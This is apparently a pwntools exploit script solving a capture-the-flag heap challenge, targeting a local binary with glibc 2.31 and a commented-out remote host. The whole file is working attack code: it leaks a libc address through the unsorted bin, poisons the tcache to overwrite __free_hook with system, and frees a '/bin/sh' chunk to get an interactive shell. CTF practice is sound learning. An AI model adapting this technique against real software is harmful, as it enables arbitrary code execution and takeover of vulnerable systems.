from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('./chall')
#libc = elf.libc
libc = ELF('libc-2.31.so')
p = elf.process(env={'LD_PRELOAD':'./libc-2.31.so'})
#p = remote('nucleus.nc.jctf.pro', 1337)
cmd = """
set max-visualize-chunk-size 0x50
"""
gdb.attach(p,cmd)

def compress(data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', data)

def decompress(data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', data)

def decomp_free(idx):
     p.sendlineafter(b'> ', b'3')
     p.sendlineafter(b': ', b'd')
     p.sendlineafter(b': ', str(idx).encode())

def comp_free(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', b'c')
    p.sendlineafter(b': ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b': ', str(idx).encode())
    p.recvuntil(b'content: ',drop=1)
    return p.recvuntil(b'\n',drop=1)

# prepare unsorted bin to get libc leak
compress(b'A'*518)
decompress(b'/bin/sh\x00' * 3)
# setup 3 chunks tcache poisoning
decompress(b'A'*24)
decompress(b'B'*24)
decompress(b'C'*24)

# libc leak
comp_free(0)
libc.address = unpack(show(0),'all') - 0x1ecbe0
print("libc address: ", hex(libc.address))

# free 3 chunks
decomp_free(3)
decomp_free(2)
decomp_free(1)

# overwrite next chunk with __free_hook
decompress(b'$64A' + p64(libc.sym.__free_hook) + b'B'*8 + b'C'*8)

# empty tcache
decompress(b'X' * 24)

# change __free_hook to system
decompress(p64(libc.sym.system)*3)

# free index 0, instead of free(0) but it will system("/bin/sh") where chunk 0 pointed to string /bin/sh
decomp_free(0)

p.interactive()
